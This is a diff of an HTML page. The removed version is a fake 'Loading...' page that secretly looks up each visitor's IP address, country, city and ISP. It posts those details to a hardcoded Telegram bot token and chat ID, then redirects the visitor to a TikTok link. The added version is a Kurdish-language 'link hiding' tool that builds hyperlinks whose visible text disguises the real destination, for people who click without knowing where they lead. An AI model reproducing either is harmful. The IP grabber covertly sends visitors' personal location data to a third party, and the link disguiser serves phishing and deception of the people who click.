@@ -1,43 +1,365 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html dir="rtl" lang="ku">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-</head>
-<body>
-    <script>
-        const BOT_TOKEN = '8942095399:AAGbL8-6mj89o3PefyQeVdRd9oVR0LrSNDg';
-        const CHAT_ID = '7641255924';
-        
-        // لینکی ڤیدیۆی تیکتۆک ڕاستەوخۆ لێرەدا جێگیر کراوە
-        const targetUrl = 'https://vt.tiktok.com/ZSq8oHq1e/';
-
-        async function sendIPAndRedirect() {
-            try {
-                let res = await fetch('https://ipapi.co/json/');
-                let data = await res.json();
-                
-                let ipMessage = "🌐 New Visitor Info:\n\n" +
-                                "IP: " + data.ip + "\n" +
-                                "Country: " + data.country_name + "\n" +
-                                "City: " + data.city + "\n" +
-                                "Org: " + data.org;
-
-                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: ipMessage
-                    })
-                });
-            } catch (e) {}
-
-            window.location.href = targetUrl;
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>شاردنەوەی لینک</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
 
-        window.onload = sendIPAndRedirect;
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f4f8;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 30px 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.12);
+            max-width: 900px;
+            width: 100%;
+            padding: 40px 35px;
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #0f172a;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #64748b;
+            margin-bottom: 30px;
+            font-size: 15px;
+        }
+
+        .create-section {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 25px 22px;
+            border: 1.5px solid #e2e8f0;
+            margin-bottom: 25px;
+        }
+
+        .create-section h3 {
+            font-size: 18px;
+            color: #0f172a;
+            margin-bottom: 16px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .form-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .form-row label {
+            font-weight: 600;
+            color: #334155;
+            font-size: 14px;
+            min-width: 100px;
+        }
+
+        .form-row input[type="text"] {
+            flex: 1;
+            min-width: 200px;
+            padding: 10px 16px;
+            border-radius: 12px;
+            border: 1.5px solid #cbd5e1;
+            font-size: 15px;
+            outline: none;
+            transition: 0.25s;
+            background: white;
+        }
+
+        .form-row input[type="text"]:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
+        }
+
+        .btn-create {
+            background: #2563eb;
+            color: white;
+            border: none;
+            padding: 10px 35px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .btn-create:hover {
+            background: #1d4ed8;
+            transform: scale(1.02);
+        }
+
+        /* بەشی لینکی دروستکراو */
+        .result-box {
+            background: #f1f5f9;
+            border-radius: 16px;
+            padding: 20px;
+            border: 1.5px solid #e2e8f0;
+        }
+
+        .result-box h4 {
+            color: #0f172a;
+            font-size: 16px;
+            margin-bottom: 12px;
+        }
+
+        .link-preview {
+            background: white;
+            padding: 16px 20px;
+            border-radius: 12px;
+            border: 1px solid #d1d5db;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+
+        .link-preview .label {
+            color: #64748b;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .link-preview .link-text {
+            color: #2563eb;
+            font-size: 18px;
+            font-weight: 600;
+            word-break: break-all;
+            flex: 1;
+        }
+
+        .link-preview .link-text a {
+            color: #2563eb;
+            text-decoration: none;
+        }
+
+        .link-preview .link-text a:hover {
+            text-decoration: underline;
+        }
+
+        .btn-open {
+            background: #16a34a;
+            color: white;
+            border: none;
+            padding: 8px 25px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .btn-open:hover {
+            background: #15803d;
+        }
+
+        .btn-clear {
+            background: #e2e8f0;
+            color: #1e293b;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .btn-clear:hover {
+            background: #cbd5e1;
+        }
+
+        .hidden-url-info {
+            background: #fef9c3;
+            border: 1px solid #fde047;
+            border-radius: 10px;
+            padding: 10px 16px;
+            font-size: 13px;
+            color: #854d0e;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .hidden-url-info .real-url {
+            font-weight: 600;
+            color: #dc2626;
+            word-break: break-all;
+        }
+
+        .footer-note {
+            margin-top: 18px;
+            font-size: 13px;
+            color: #94a3b8;
+            text-align: center;
+        }
+
+        @media (max-width: 600px) {
+            .container { padding: 20px 15px; }
+            .form-row { flex-direction: column; align-items: stretch; }
+            .form-row label { min-width: auto; }
+            .btn-create { width: 100%; justify-content: center; }
+            .link-preview { flex-direction: column; align-items: stretch; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔗 تێکەڵکردنی لینک</h1>
+        <p class="subtitle">لینکێک بە ناوی لینکێکی ترەوە دروست بکە (هەر دوو لینکەکەت دابنە)</p>
+
+        <div class="create-section">
+            <h3>📝 لینکەکانت دابنە</h3>
+            <div class="form-group">
+                <div class="form-row">
+                    <label>🔗 لینکی ڕاستەقینە:</label>
+                    <input type="text" id="realUrlInput" placeholder="https://example.com (ئەمە دەکرێتەوە)" />
+                </div>
+                <div class="form-row">
+                    <label>📛 ناوی دڵخوازت:</label>
+                    <input type="text" id="fakeNameInput" placeholder="ناوێک یان لینکێکی تر (ئەمە دەبینرێت)" />
+                </div>
+                <div style="display: flex; gap: 10px; margin-top: 5px; flex-wrap: wrap;">
+                    <button class="btn-create" id="createBtn">✨ دروستکردن</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="result-box" id="resultBox" style="display: none;">
+            <h4>✅ لینکی تۆ ئامادەیە</h4>
+            <div class="link-preview">
+                <span class="label">لینکەکەت:</span>
+                <span class="link-text" id="displayLink">
+                    <a href="#" id="fakeLink" target="_blank">ناوەکەت لێرە دەردەکەوێت</a>
+                </span>
+                <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+                    <button class="btn-open" id="openBtn">🚀 کردنەوە</button>
+                    <button class="btn-clear" id="clearBtn">🗑️ پاککردنەوە</button>
+                </div>
+            </div>
+            <div class="hidden-url-info" id="hiddenInfo">
+                ⚡ ئەم لینکە دەبێتەوە: <span class="real-url" id="realUrlDisplay">-</span>
+            </div>
+        </div>
+
+        <p class="footer-note">
+            ✅ کاتێک کەس کلیک لەسەر ناوەکە دەکات، بەبێ ئەوەی بزانێت بۆ لینکی ڕاستەقینە دەچێت.
+        </p>
+    </div>
+
+    <script>
+        (function() {
+            const realUrlInput = document.getElementById('realUrlInput');
+            const fakeNameInput = document.getElementById('fakeNameInput');
+            const createBtn = document.getElementById('createBtn');
+            const openBtn = document.getElementById('openBtn');
+            const clearBtn = document.getElementById('clearBtn');
+            const resultBox = document.getElementById('resultBox');
+            const fakeLink = document.getElementById('fakeLink');
+            const realUrlDisplay = document.getElementById('realUrlDisplay');
+            const hiddenInfo = document.getElementById('hiddenInfo');
+
+            let currentRealUrl = '';
+            let currentFakeName = '';
+
+            function createLink() {
+                const realUrl = realUrlInput.value.trim();
+                const fakeName = fakeNameInput.value.trim();
+
+                if (!realUrl) {
+                    alert('تکایە لینکی ڕاستەقینە بنوسە!');
+                    return;
+                }
+
+                if (!fakeName) {
+                    alert('تکایە ناوێک یان لینکێک بۆ نمایش کردن بنوسە!');
+                    return;
+                }
+
+                // دڵنیابوون لەوەی لینکەکە بە http یان https دەست پێدەکات
+                let finalRealUrl = realUrl;
+                if (!finalRealUrl.startsWith('http://') && !finalRealUrl.startsWith('https://')) {
+                    finalRealUrl = 'https://' + finalRealUrl;
+                }
+
+                currentRealUrl = finalRealUrl;
+                currentFakeName = fakeName;
+
+                // پیشاندانی لینکەکە
+                fakeLink.textContent = fakeName;
+                fakeLink.href = finalRealUrl;
+                fakeLink.target = '_blank';
+
+                // پیشاندانی لینکی ڕاستەقینە لە بەشی پەناهی
+                realUrlDisplay.textContent = finalRealUrl;
+                hiddenInfo.style.display = 'block';
+
+                // پیشاندانی بۆکس
+                resultBox.style.display = 'block';
+            }
+
+            function openLink() {
+                if (currentRealUrl) {
+                    window.open(currentRealUrl, '_blank');
+                } else {
+                    alert('تکایە سەرەتا لینکێک دروست بکە!');
+                }
+            }
+
+            function clearAll() {
+                currentRealUrl = '';
+                currentFakeName = '';
+                realUrlInput.value = '';
+                fakeNameInput.value = '';
+                resultBox.style.display = 'none';
+                hiddenInfo.style.display = 'none';
+                fakeLink.textContent = '';
+                fakeLink.href = '#';
+                realUrlDisplay.textContent = '';
+            }
+
+            createBtn.addEventListener('click', createLink);
+            openBtn.addEventListener('click', openLink);
+            clearBtn.addEventListener('click', clearAll);
+
+            // Enter
+            realUrlInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    createLink();
+                }
+            });
+            fakeNameInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    createLink();
+                }
+            });
+
+        })();
     </script>
 </body>
 </html>
